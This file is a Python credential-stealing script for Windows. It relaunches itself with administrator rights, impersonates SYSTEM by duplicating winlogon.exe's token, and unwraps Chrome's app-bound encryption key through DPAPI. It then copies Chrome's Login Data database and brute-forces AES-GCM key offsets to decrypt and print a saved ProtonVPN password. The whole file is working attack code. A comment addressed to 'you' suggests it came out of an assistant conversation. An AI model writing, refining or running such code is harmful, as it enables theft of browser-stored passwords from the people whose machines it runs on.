import os, json, base64, sqlite3, shutil, ctypes, sys, psutil
import win32crypt, win32security, win32api, win32con
from Cryptodome.Cipher import AES

def impersonate_system():
    try:
        h_token = win32security.OpenProcessToken(win32api.GetCurrentProcess(), win32security.TOKEN_ADJUST_PRIVILEGES | win32security.TOKEN_QUERY)
        priv_id = win32security.LookupPrivilegeValue(None, win32security.SE_DEBUG_NAME)
        win32security.AdjustTokenPrivileges(h_token, 0, [(priv_id, win32security.SE_PRIVILEGE_ENABLED)])
        target_pid = next(p.info['pid'] for p in psutil.process_iter(['name', 'pid']) if p.info['name'].lower() == 'winlogon.exe')
        h_proc = win32api.OpenProcess(win32con.PROCESS_QUERY_INFORMATION, False, target_pid)
        h_tok = win32security.OpenProcessToken(h_proc, win32security.TOKEN_DUPLICATE | win32security.TOKEN_QUERY)
        new_tok = win32security.DuplicateTokenEx(h_tok, win32security.SecurityImpersonation, win32security.TOKEN_ALL_ACCESS, win32security.TokenPrimary)
        win32security.ImpersonateLoggedOnUser(new_tok)
        return True
    except: return False

def get_132_byte_blob():
    path = os.path.join(os.environ["LOCALAPPDATA"], r"Google\Chrome\User Data\Local State")
    with open(path, "r", encoding="utf-8") as f:
        ls = json.load(f)
    raw_key = base64.b64decode(ls["os_crypt"]["app_bound_encrypted_key"])[4:]
    impersonate_system()
    stage1 = win32crypt.CryptUnprotectData(raw_key, None, None, None, 0)[1]
    win32security.RevertToSelf()
    return win32crypt.CryptUnprotectData(stage1, None, None, None, 0)[1]

def ultimate_hunter(enc_pass, blob):
    iv = enc_pass[3:15]
    payload = enc_pass[15:]
    ciphertext = payload[:-16]
    tag = payload[-16:]
    
    # Strategy 1: Test every 32-byte chunk in the 132-byte blob
    # Strategy 2: Test multiple Contexts (AADs)
    aads = [b'browser', b'', b'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe']

    print(f"[*] Starting Brute-Force Hunt across {len(blob)} bytes...")
    
    for offset in range(len(blob) - 31):
        candidate_key = blob[offset:offset+32]
        for aad in aads:
            try:
                cipher = AES.new(candidate_key, AES.MODE_GCM, iv)
                if aad: cipher.update(aad)
                decrypted = cipher.decrypt_and_verify(ciphertext, tag)
                return offset, aad, decrypted.decode('utf-8')
            except:
                continue
    return None

def main():
    if not ctypes.windll.shell32.IsUserAnAdmin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
        return

    blob = get_132_byte_blob()
    
    db_path = os.path.join(os.environ["LOCALAPPDATA"], r"Google\Chrome\User Data\Default\Login Data")
    temp_db = "ultimate_diag.db"
    shutil.copyfile(db_path, temp_db)

    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    # Let's target the ProtonVPN entry you found earlier
    cursor.execute("SELECT origin_url, password_value FROM logins WHERE origin_url LIKE '%protonvpn%' LIMIT 1")
    row = cursor.fetchone()

    if row:
        url, enc_pass = row
        print(f"[*] Targeting: {url}")
        result = ultimate_hunter(enc_pass, blob)
        
        if result:
            offset, aad, plaintext = result
            print(f"\n[!!!] KEY FOUND!")
            print(f"    Offset in Blob: {offset}")
            print(f"    Correct AAD:    {aad}")
            print(f"    Password:       {plaintext}")
        else:
            print("\n[-] Hunt failed. The key may be further encrypted with a machine-unique GUID.")
    
    conn.close()
    os.remove(temp_db)
    input("\nPress Enter to exit...")

if __name__ == "__main__":
    main()